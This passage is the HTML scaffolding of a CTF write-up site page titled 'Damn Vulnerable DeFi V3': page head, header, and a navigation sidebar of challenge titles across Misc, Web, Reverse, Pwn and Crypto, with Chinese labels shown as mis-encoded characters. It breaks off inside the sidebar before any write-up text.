
<!doctype html>
<html lang="zh" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
        <meta name="author" content="YanhuiJessica">
      
      
        <link rel="canonical" href="https://yanhuijessica.github.io/Chictf-Writeups/wargames/damn_vulnerable_defi/">
      
      <link rel="icon" href="../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.5.3, mkdocs-material-8.3.3">
    
    
      
        <title>Damn Vulnerable DeFi V3 - Chictf-Writeups</title>
      
    
    
  
      <link rel="stylesheet" href="../../assets/stylesheets/main.4a0965b7.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.cbb835fc.min.css">
        
          
          
          <meta name="theme-color" content="#ffffff">
        
      
      
    
<style>
  .md-typeset h1 {
    color:var(--md-default-fg-color--light);
    font-size:2em;
    line-height:1.3;
    margin:0 0 1em;
  }
</style>

    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Fira+Sans:300,300i,400,400i,700,700i%7CFira+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Fira Sans";--md-code-font:"Fira Mono"}</style>
      
    
    
    <script>__md_scope=new URL("../..",location),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
  </head>
  
  
    
    
    
    
    
    <body dir="ltr" data-md-color-scheme="" data-md-color-primary="white" data-md-color-accent="red">
  
    
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#how-to-play" class="md-skip">
          Ë∑≥ËΩ¨Ëá≥
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="È°µÁúâ">
    <a href="../.." title="Chictf-Writeups" class="md-header__button md-logo" aria-label="Chictf-Writeups" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 3 1 9l11 6 9-4.91V17h2V9M5 13.18v4L12 21l7-3.82v-4L12 17l-7-3.82Z"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Chictf-Writeups
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Damn Vulnerable DeFi V3
            
          </span>
        </div>
      </div>
    </div>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="ÊêúÁ¥¢" placeholder="ÊêúÁ¥¢" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Êü•Êâæ">
        
          <a href="javascript:void(0)" class="md-search__icon md-icon" aria-label="ÂàÜ‰∫´" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7 0-.24-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91 1.61 0 2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08Z"/></svg>
          </a>
        
        <button type="reset" class="md-search__icon md-icon" aria-label="Ê∏ÖÁ©∫ÂΩìÂâçÂÜÖÂÆπ" tabindex="-1">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
        </button>
      </nav>
      
        <div class="md-search__suggest" data-md-component="search-suggest"></div>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Ê≠£Âú®ÂàùÂßãÂåñÊêúÁ¥¢ÂºïÊìé
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
      <div class="md-header__source">
        <a href="https://github.com/YanhuiJessica/Chictf-Writeups" title="ÂâçÂæÄ‰ªìÂ∫ì" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.1.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
  </div>
  <div class="md-source__repository">
    YanhuiJessica/Chictf-Writeups
  </div>
</a>
      </div>
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
            
<nav class="md-tabs" aria-label="Ê†áÁ≠æ" data-md-component="tabs">
  <div class="md-tabs__inner md-grid">
    <ul class="md-tabs__list">
      
        
  
  


  
  
  
    <li class="md-tabs__item">
      <a href="../.." class="md-tabs__link">
        ÁÆÄ‰ªã
      </a>
    </li>
  

      
        
  
  


  
  
  
    <li class="md-tabs__item">
      <a href="../../misc/unpleasant_music/" class="md-tabs__link">
        Misc
      </a>
    </li>
  

      
        
  
  


  
  
  
    <li class="md-tabs__item">
      <a href="../../web/t_star_upload_bypass/" class="md-tabs__link">
        Web
      </a>
    </li>
  

      
        
  
  


  
  
  
    <li class="md-tabs__item">
      <a href="../../reverse/easyre/" class="md-tabs__link">
        Reverse
      </a>
    </li>
  

      
        
  
  


  
  
  
    <li class="md-tabs__item">
      <a href="../../pwn/when_did_you_born/" class="md-tabs__link">
        Pwn
      </a>
    </li>
  

      
        
  
  


  
  
  
    <li class="md-tabs__item">
      <a href="../../crypto/bank/" class="md-tabs__link">
        Crypto
      </a>
    </li>
  

      
        
  
  


  
  
  
    <li class="md-tabs__item">
      <a href="../../blockchain/code_is_law/" class="md-tabs__link">
        Blockchain
      </a>
    </li>
  

      
        
  
  
    
  


  
  
  
    

  
  
  
    <li class="md-tabs__item">
      <a href="../natas/" class="md-tabs__link md-tabs__link--active">
        Wargames
      </a>
    </li>
  

  

      
        
  
  


  
  
  
    <li class="md-tabs__item">
      <a href="../../eggs/ctfhub_index/" class="md-tabs__link">
        ÂΩ©Ëõã
      </a>
    </li>
  

      
    </ul>
  </div>
</nav>
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

  


<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="ÂØºËà™Ê†è" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="Chictf-Writeups" class="md-nav__button md-logo" aria-label="Chictf-Writeups" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 3 1 9l11 6 9-4.91V17h2V9M5 13.18v4L12 21l7-3.82v-4L12 17l-7-3.82Z"/></svg>

    </a>
    Chictf-Writeups
  </label>
  
    <div class="md-nav__source">
      <a href="https://github.com/YanhuiJessica/Chictf-Writeups" title="ÂâçÂæÄ‰ªìÂ∫ì" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.1.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
  </div>
  <div class="md-source__repository">
    YanhuiJessica/Chictf-Writeups
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_1" type="checkbox" id="__nav_1" >
      
      
      
      
        <label class="md-nav__link" for="__nav_1">
          ÁÆÄ‰ªã
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="ÁÆÄ‰ªã" data-md-level="1">
        <label class="md-nav__title" for="__nav_1">
          <span class="md-nav__icon md-icon"></span>
          ÁÆÄ‰ªã
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        È¶ñÈ°µ
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../how_to_participate/" class="md-nav__link">
        Â¶Ç‰ΩïÂèÇ‰∏é
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2" type="checkbox" id="__nav_2" >
      
      
      
      
        <label class="md-nav__link" for="__nav_2">
          Misc
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Misc" data-md-level="1">
        <label class="md-nav__title" for="__nav_2">
          <span class="md-nav__icon md-icon"></span>
          Misc
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/unpleasant_music/" class="md-nav__link">
        Unpleasant music
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/leaf_cover_eyes/" class="md-nav__link">
        ‰∏ÄÂè∂ÈöúÁõÆ
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/difficult_programming_language/" class="md-nav__link">
        Difficult Programming Language
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/secret_information/" class="md-nav__link">
        Êú∫ÂØÜ‰ø°ÊÅØ
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/hide_and_seek/" class="md-nav__link">
        ËóèËóèËóè
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/targz_y1ng/" class="md-nav__link">
        TARGZ-y1ng
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/gakki/" class="md-nav__link">
        gakki
      </a>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_8" type="checkbox" id="__nav_2_8" >
      
      
      
      
        <label class="md-nav__link" for="__nav_2_8">
          HackerGame 2020
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="HackerGame 2020" data-md-level="2">
        <label class="md-nav__title" for="__nav_2_8">
          <span class="md-nav__icon md-icon"></span>
          HackerGame 2020
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/account_bot/" class="md-nav__link">
        ‰ªéÈõ∂ÂºÄÂßãÁöÑËÆ∞Ë¥¶Â∑•ÂÖ∑‰∫∫
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/gibberish_message/" class="md-nav__link">
        ‰ªéÈõ∂ÂºÄÂßãÁöÑÁÅ´ÊòüÊñáÁîüÊ¥ª
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/self_repeating_repeater/" class="md-nav__link">
        Ëá™Â§çËØªÁöÑÂ§çËØªÊú∫
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/233_string_tool/" class="md-nav__link">
        233 ÂêåÂ≠¶ÁöÑÂ≠óÁ¨¶‰∏≤Â∑•ÂÖ∑
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/233_docker/" class="md-nav__link">
        233 ÂêåÂ≠¶ÁöÑ Docker
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/4f_system_middle/" class="md-nav__link">
        Êù•Ëá™‰∏ÄÊïôÁöÑÂõæÁâá
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/basic_math_simulator/" class="md-nav__link">
        Ë∂ÖÂü∫Á°ÄÁöÑÊï∞ÁêÜÊ®°ÊãüÂô®
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/stegano50/" class="md-nav__link">
        Stegano50
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/newsctf_all_reverse/" class="md-nav__link">
        NEWSCTF - ÔºÅ‰∫ÜÂèçÈÉΩÔºå‰∫ÜÂèç
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/audio_frequency_stego/" class="md-nav__link">
        audio-frequency-stego
      </a>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_12" type="checkbox" id="__nav_2_12" >
      
      
      
      
        <label class="md-nav__link" for="__nav_2_12">
          DeconstruCT.F 2021
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="DeconstruCT.F 2021" data-md-level="2">
        <label class="md-nav__title" for="__nav_2_12">
          <span class="md-nav__icon md-icon"></span>
          DeconstruCT.F 2021
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/pirates/" class="md-nav__link">
        Pirates
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/teg_rads/" class="md-nav__link">
        Teg Rads
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/hearing_not_believing/" class="md-nav__link">
        HearingNotBelieving
      </a>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_14" type="checkbox" id="__nav_2_14" >
      
      
      
      
        <label class="md-nav__link" for="__nav_2_14">
          HackerGame 2021
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="HackerGame 2021" data-md-level="2">
        <label class="md-nav__title" for="__nav_2_14">
          <span class="md-nav__icon md-icon"></span>
          HackerGame 2021
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/transparent_file/" class="md-nav__link">
        ÈÄèÊòéÁöÑÊñá‰ª∂
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/encrypted_u_disk/" class="md-nav__link">
        Âä†ÂØÜÁöÑ U Áõò
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/p_q/" class="md-nav__link">
        püò≠q
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_15" type="checkbox" id="__nav_2_15" >
      
      
      
      
        <label class="md-nav__link" for="__nav_2_15">
          Ë•øÊπñËÆ∫Ââë 2021
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Ë•øÊπñËÆ∫Ââë 2021" data-md-level="2">
        <label class="md-nav__title" for="__nav_2_15">
          <span class="md-nav__icon md-icon"></span>
          Ë•øÊπñËÆ∫Ââë 2021
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/yusa_little_secret/" class="md-nav__link">
        YUSAÁöÑÂ∞èÁßòÂØÜ
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/yusa_secret/" class="md-nav__link">
        YusaÁöÑÁßòÂØÜ
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/compress_the_flag/" class="md-nav__link">
        Compress The Flag
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/s_script_gi/" class="md-nav__link">
        s/&lt;script&gt;//gi
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/log4_sanity_check/" class="md-nav__link">
        Log 4 sanity check
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/bishop_duel/" class="md-nav__link">
        Bishop Duel
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/lighthouse/" class="md-nav__link">
        Lighthouse
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/last_digit/" class="md-nav__link">
        last digit
      </a>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_22" type="checkbox" id="__nav_2_22" >
      
      
      
      
        <label class="md-nav__link" for="__nav_2_22">
          HeroCTF 2023
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="HeroCTF 2023" data-md-level="2">
        <label class="md-nav__title" for="__nav_2_22">
          <span class="md-nav__icon md-icon"></span>
          HeroCTF 2023
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/chm0d/" class="md-nav__link">
        Chm0d
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/sudoklu/" class="md-nav__link">
        SUDOkLu
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3" type="checkbox" id="__nav_3" >
      
      
      
      
        <label class="md-nav__link" for="__nav_3">
          Web
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Web" data-md-level="1">
        <label class="md-nav__title" for="__nav_3">
          <span class="md-nav__icon md-icon"></span>
          Web
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../web/t_star_upload_bypass/" class="md-nav__link">
        Êñá‰ª∂‰∏ä‰º† JS ÁªïËøá
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../web/t_star_tomcat/" class="md-nav__link">
        Â∞èÁå´Âí™Ë∏©ÁÅØÊ≥°
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../web/ctfhub_reflected_xss/" class="md-nav__link">
        CTFHub - ÂèçÂ∞ÑÂûã XSS
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../web/initiative/" class="md-nav__link">
        ‰∏ªÂä®
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../web/funhash/" class="md-nav__link">
        Funhash
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../web/xss_game/" class="md-nav__link">
        XSS Game
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../web/web_php_include/" class="md-nav__link">
        Web php include
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../web/ctfhub_git_leakage/" class="md-nav__link">
        CTFHub - Git Ê≥ÑÈú≤
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../web/newsctf_easy_web/" class="md-nav__link">
        NEWSCTF - easy_web
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../web/heres_a_flag/" class="md-nav__link">
        Here's a Flag
      </a>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_11" type="checkbox" id="__nav_3_11" >
      
      
      
      
        <label class="md-nav__link" for="__nav_3_11">
          HackerGame 2021
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="HackerGame 2021" data-md-level="2">
        <label class="md-nav__title" for="__nav_3_11">
          <span class="md-nav__icon md-icon"></span>
          HackerGame 2021
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../web/sale_melon/" class="md-nav__link">
        ÂçñÁìú
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../web/flag_red_packet/" class="md-nav__link">
        FLAG Âä©ÂäõÂ§ßÁ∫¢ÂåÖ
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../web/info_above_graph/" class="md-nav__link">
        Âõæ‰πã‰∏äÁöÑ‰ø°ÊÅØ
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../web/most_secure_crypto_algo/" class="md-nav__link">
        Most Secure Crypto Algo
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../web/calculus_calc_exercise/" class="md-nav__link">
        ÂæÆÁßØÂàÜËÆ°ÁÆóÂ∞èÁªÉ‰π†
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4" type="checkbox" id="__nav_4" >
      
      
      
      
        <label class="md-nav__link" for="__nav_4">
          Reverse
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Reverse" data-md-level="1">
        <label class="md-nav__title" for="__nav_4">
          <span class="md-nav__icon md-icon"></span>
          Reverse
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../reverse/easyre/" class="md-nav__link">
        EasyRe
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../reverse/z3/" class="md-nav__link">
        z3
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../reverse/newsctf_re_signin/" class="md-nav__link">
        NEWSCTF - re_signin
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_5" type="checkbox" id="__nav_5" >
      
      
      
      
        <label class="md-nav__link" for="__nav_5">
          Pwn
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Pwn" data-md-level="1">
        <label class="md-nav__title" for="__nav_5">
          <span class="md-nav__icon md-icon"></span>
          Pwn
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../pwn/when_did_you_born/" class="md-nav__link">
        when did you born
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../pwn/amnesia/" class="md-nav__link">
        Amnesia
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_6" type="checkbox" id="__nav_6" >
      
      
      
      
        <label class="md-nav__link" for="__nav_6">
          Crypto
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Crypto" data-md-level="1">
        <label class="md-nav__title" for="__nav_6">
          <span class="md-nav__icon md-icon"></span>
          Crypto
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/bank/" class="md-nav__link">
        bank
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/shanghai/" class="md-nav__link">
        shanghai
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/easy_rsa/" class="md-nav__link">
        easy_RSA
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/normal_rsa/" class="md-nav__link">
        Normal_RSA
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/easy_ecc/" class="md-nav__link">
        easy_ECC
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/fanfie/" class="md-nav__link">
        fanfie
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/jefferson_disk/" class="md-nav__link">
        ËΩ¨ËΩÆÊú∫Âä†ÂØÜ
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/code_modulate/" class="md-nav__link">
        ÁºñÁ†Å‰∏éË∞ÉÂà∂
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/ciscn_rsa/" class="md-nav__link">
        CISCN - rsa
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/opisthocomus_hoazin/" class="md-nav__link">
        opisthocomus-hoazin
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/stars_and_shapes/" class="md-nav__link">
        Stars and Shapes
      </a>
    </li>
  

            
          
            
              
  
